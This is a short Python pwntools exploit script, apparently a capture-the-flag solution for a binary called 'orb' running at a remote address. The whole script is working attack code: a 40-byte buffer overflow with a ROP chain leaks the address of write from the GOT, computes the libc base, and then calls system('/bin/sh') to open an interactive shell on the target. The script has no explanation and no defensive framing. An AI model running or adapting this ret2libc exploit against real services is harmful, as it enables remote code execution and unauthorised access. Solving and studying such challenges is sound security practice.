from pwn import *

context.binary = elf = ELF('./orb')

# pr = process()
pr = remote('83.136.254.23',57832)
libc = elf.libc
rop = ROP(elf)
rop.call(elf.symbols['write'], [1, elf.got['write']])
rop.call(elf.symbols['main'])
pr.send(b'A'*40+rop.chain())   
pr.recvuntil(b'work..\n\n\x00')

write_leak = pr.recv(8)
write_leak = u64(write_leak)
libc.address = write_leak - libc.symbols['write']
log.info(f'write@libc: {hex(write_leak)}')
log.info(f'libc: {hex(libc.address)}')

rop2 = ROP(libc)
rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
pr.send(b'A'*40+rop2.chain())
pr.interactive()
